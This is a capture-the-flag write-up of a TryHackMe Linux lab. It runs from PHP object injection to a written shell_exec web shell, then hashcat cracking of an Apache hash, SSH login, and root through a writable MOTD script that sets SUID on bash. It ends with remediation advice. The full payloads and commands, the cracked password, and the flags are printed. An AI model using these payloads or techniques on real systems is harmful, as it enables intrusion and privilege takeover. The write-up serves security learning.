# TryHackMe --- Debug Linux

> **Platform:** TryHackMe\
> **Target:** `10.112.154.13`\
> **Focus:** PHP Object Injection → Arbitrary File Write → Remote Code
> Execution → Credential Cracking → MOTD Privilege Escalation\
> **Difficulty:** CTF / Linux Privilege Escalation
>
> This write-up documents the exploitation path observed during the
> authorized TryHackMe lab. Flags are included for personal lab notes.

## 1. Reconnaissance

### Nmap scan

Start with a full TCP port scan, service/version detection, and default
scripts:

``` bash
nmap -sC -sV -Pn -p- 10.112.154.13 -oN nmap.txt
```

Relevant results:

        Port Service   Version / Details
  ---------- --------- ----------------------------------
    `22/tcp` SSH       OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
    `80/tcp` HTTP      Apache httpd 2.4.18 (Ubuntu)

Only SSH and HTTP were exposed. The web service was the main entry point
for further enumeration.

## 2. Web Enumeration

Browsing to `http://10.112.154.13/` showed the default Apache Ubuntu
page. Further enumeration revealed a web form at `/index.php` and a
browsable `/backup/` directory.

The backup directory exposed source backups, including:

-   `/backup/index.php.bak`
-   `/backup/index.html.bak`
-   `/backup/readme.md`

The PHP backup was especially useful because it revealed the
application's implementation.

### Vulnerable PHP code

The relevant code was:

``` php
<?php

class FormSubmit {

    public $form_file = 'message.txt';
    public $message = '';

    public function SaveMessage() {
        $NameArea = $_GET['name'];
        $EmailArea = $_GET['email'];
        $TextArea = $_GET['comments'];

        $this->message =
            "Message From : " . $NameArea .
            " || From Email : " . $EmailArea .
            " || Comment : " . $TextArea . "\n";
    }

    public function __destruct() {
        file_put_contents(
            __DIR__ . '/' . $this->form_file,
            $this->message,
            FILE_APPEND
        );
        echo 'Your submission has been successfully saved!';
    }
}

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application->SaveMessage();

?>
```

The critical line is:

``` php
$messageDebug = unserialize($debug);
```

The application deserializes user-controlled data from the `debug` query
parameter. The `FormSubmit` class also has a destructor that writes the
object's `message` property to a path constructed from its `form_file`
property.

Because both properties can be set through a serialized object, this
creates a **PHP Object Injection** vulnerability that can be used for
**arbitrary file write** within the web directory.

## 3. Confirming Arbitrary File Write

A serialized `FormSubmit` object can set `form_file` and `message`. The
following proof of concept writes a test string to `probe.txt`:

``` bash
P='O:10:"FormSubmit":2:{s:9:"form_file";s:9:"probe.txt";s:7:"message";s:10:"DEBUG_TEST";}'

curl -s -G 'http://10.112.154.13/index.php' \
  --data-urlencode "debug=$P" \
  --data-urlencode 'name=test' \
  --data-urlencode 'email=test@example.com' \
  --data-urlencode 'comments=baseline'

curl -i 'http://10.112.154.13/probe.txt'
```

The response contained `DEBUG_TEST`, confirming that the application
could be made to write attacker-controlled content to a file in the web
root.

## 4. Turning File Write into PHP Execution

The next step was to verify that a written `.php` file would be executed
by the web server. A PHP test file was written using the same
object-injection technique. The response from `probe.php` contained:

``` text
PHP_EXECUTED
```

This confirmed that PHP files created in the web root were interpreted
by the server.

### Creating a command-execution endpoint

A small PHP endpoint was then written to pass a supplied `cmd` parameter
to `shell_exec()`:

``` php
<?php echo shell_exec($_GET["cmd"]); ?>
```

Because PHP serialized strings contain explicit lengths, the payload was
generated with Python to avoid mistakes in the string-length fields:

``` bash
python3 - <<'PY'
payload = '<?php echo shell_exec($_GET["cmd"]); ?>'
filename = 'shell.php'

serialized = (
    'O:10:"FormSubmit":2:{'
    f's:9:"form_file";s:{len(filename)}:"{filename}";'
    f's:7:"message";s:{len(payload)}:"{payload}";'
    '}'
)

with open('/tmp/payload.txt', 'w') as f:
    f.write(serialized)

print(serialized)
PY
```

Submit the serialized object to the vulnerable endpoint:

``` bash
P=$(cat /tmp/payload.txt)

curl -s -G 'http://10.112.154.13/index.php' \
  --data-urlencode "debug=$P" \
  --data-urlencode 'name=test' \
  --data-urlencode 'email=test@example.com' \
  --data-urlencode 'comments=baseline' \
  -o /dev/null
```

Test command execution:

``` bash
curl -s 'http://10.112.154.13/shell.php?cmd=id'
```

Output:

``` text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote Code Execution (RCE) was achieved as the low-privileged Apache
account, `www-data`.

> **Root cause:** Untrusted serialized input was deserialized, and the
> resulting object could control a file-writing operation. Writing
> attacker-controlled PHP code into the document root turned the
> file-write primitive into server-side command execution.

## 5. Enumerating the Host and Finding Credentials

With command execution available, inspect the web root and home
directories:

``` bash
curl -sG 'http://10.112.154.13/shell.php' \
  --data-urlencode 'cmd=whoami;pwd;ls -la /home'
```

The output confirmed execution as `www-data` from `/var/www/html` and
showed a home directory for `james`.

The web root also contained a `.htpasswd` file. Its relevant entry was:

``` text
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

This is an Apache APR1-MD5 password hash. The hash could be attacked
offline using a wordlist.

### Preparing the hash for Hashcat

The original file included the username and hash separated by a colon.
Extract only the hash before running Hashcat:

``` bash
cut -d ':' -f 2 hash.txt > hash_only.txt
```

Run Hashcat with mode `1600`, which supports Apache `$apr1$` hashes:

``` bash
hashcat -m 1600 hash_only.txt /usr/share/wordlists/rockyou.txt
```

Hashcat recovered the password:

``` text
$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1:jamaica
```

Verify the recovered result with:

``` bash
hashcat -m 1600 hash_only.txt /usr/share/wordlists/rockyou.txt --show
```

Recovered credential:

  Username   Password
  ---------- -----------
  `james`    `jamaica`

This demonstrates why password hashes discovered on a compromised host
should be treated as sensitive: weak passwords may be recovered offline
if the hash format and a suitable wordlist are available.

## 6. SSH Access as James

Use the recovered credentials to connect over SSH:

``` bash
ssh james@10.112.154.13
```

Enter the recovered password when prompted.

The user flag was found in James's home directory:

``` bash
cat /home/james/user.txt
```

**User flag:**

``` text
7e37c84a66cc40b1c6bf700d08d28c20
```

## 7. Privilege Escalation Enumeration

First, check sudo permissions:

``` bash
sudo -l
```

The system responded that `james` could not run sudo on the host. The
next step was to inspect writable files and scheduled/login-related
scripts.

The SSH login displayed a message from root asking James to improve the
SSH welcome message. This was a clue to investigate the Message of the
Day (MOTD) scripts.

List the MOTD scripts and their permissions:

``` bash
ls -la /etc/update-motd.d/
```

A writable script stood out:

``` text
-rwxrwxr-x 1 root james 1220 Mar 10 2021 00-header
```

The script was owned by root but writable by members of the `james`
group. Since James belonged to that group, he could modify a script that
is executed as part of the login MOTD process.

Confirm writable files with:

``` bash
find /etc/update-motd.d/ -maxdepth 1 -type f -writable -ls
```

This is a dangerous permissions misconfiguration: a low-privileged user
can alter a script that runs with root privileges during SSH login.

## 8. Privilege Escalation via MOTD Script

Append a command to the writable MOTD script to set the SUID bit on
Bash:

``` bash
echo 'chmod +s /bin/bash' >> /etc/update-motd.d/00-header
```

Exit the SSH session and reconnect as James. The login triggers the MOTD
scripts, causing the appended command to run with root privileges.

Check Bash's permissions:

``` bash
ls -l /bin/bash
```

The output showed the SUID bit set:

``` text
-rwsr-sr-x 1 root root 1037528 May 16 2017 /bin/bash
```

Launch Bash in privileged mode:

``` bash
/bin/bash -p
```

Verify the effective identity:

``` bash
id
```

The effective UID was `0` (`root`), confirming successful privilege
escalation.

### Why this worked

-   The MOTD script was executed during SSH login.
-   The script was writable by `james` through group permissions.
-   The appended `chmod +s /bin/bash` command ran with root privileges.
-   The SUID bit allowed Bash to run with the file owner's effective
    privileges.
-   The `-p` option preserved Bash's elevated privileges instead of
    dropping them.

**Security lesson:** Scripts executed by privileged processes must never
be writable by untrusted or low-privileged users.

## 9. Retrieving the Root Flag

With a root-effective Bash shell, read the root flag:

``` bash
cat /root/root.txt
```

**Root flag:**

``` text
3c8c3d0fe758c320d158e32f68fabf4b
```

## 10. Attack Chain Summary

1.  **Port scanning:** Identified SSH on port 22 and Apache on port 80.
2.  **Web enumeration:** Found a backup directory exposing PHP source
    code.
3.  **PHP Object Injection:** Identified unsafe deserialization of the
    `debug` parameter.
4.  **Arbitrary file write:** Controlled the filename and content
    written by the object's destructor.
5.  **Remote Code Execution:** Wrote a PHP command-execution endpoint
    into the web root and executed commands as `www-data`.
6.  **Credential discovery:** Found James's APR1-MD5 hash in
    `.htpasswd`.
7.  **Offline password cracking:** Used Hashcat mode 1600 and
    `rockyou.txt` to recover `jamaica`.
8.  **Initial access:** Logged in as `james` over SSH and retrieved the
    user flag.
9.  **Privilege escalation:** Found a root-executed MOTD script writable
    by the `james` group.
10. **Root access:** Modified the MOTD script to set Bash's SUID bit,
    then used `bash -p` to retrieve the root flag.

## 11. Remediation

### Web application

-   **Do not deserialize untrusted input.** Avoid PHP `unserialize()` on
    user-controlled data. Use a safe, explicitly validated data format
    instead.
-   **Remove debug code from production.** The `debug` parameter and
    debugging-only deserialization should not be deployed.
-   **Prevent arbitrary file writes.** Never let users control a
    filesystem path without strict validation and an allowlist. Use a
    fixed destination and safe file permissions.
-   **Prevent executable uploads/writes in the web root.** The
    web-server account should not be able to create or modify executable
    PHP files in served directories.
-   **Protect backup files.** Do not expose source backups or directory
    listings through the web server.
-   **Restrict command execution.** Avoid shell execution from request
    parameters and run web applications with least privilege.
-   **Rotate exposed credentials.** Treat credentials or hashes found in
    web-accessible files as compromised.

### Linux permissions and privilege escalation

-   **Fix MOTD script permissions.** Root-owned scripts executed during
    login must not be writable by ordinary users or untrusted groups.
-   **Audit privileged scripts regularly.** Review ownership, group
    membership, and write permissions for scripts invoked by root.
-   **Avoid SUID changes to shells.** Do not grant SUID permissions to
    Bash; investigate and remove unexpected SUID bits.
-   **Use least privilege and monitoring.** Log changes to privileged
    scripts and binaries, and alert on suspicious permission changes.

## 12. Key Takeaways

-   A source-code backup can reveal the exact logic needed to exploit a
    web application.
-   PHP Object Injection can become much more serious when magic methods
    such as `__destruct()` perform file operations.
-   Arbitrary file write can escalate to RCE when an attacker can write
    executable code into a web-served directory.
-   APR1-MD5 hashes can be attacked offline; weak passwords and exposed
    hashes create a serious risk.
-   Privilege escalation is not always about `sudo` or SUID binaries
    already present. Writable scripts executed by root can be equally
    dangerous.
-   Correct ownership and permissions are a core part of Linux security.

------------------------------------------------------------------------

*Write-up prepared for personal TryHackMe lab notes. Run these
techniques only in systems and environments where you have explicit
authorization.*
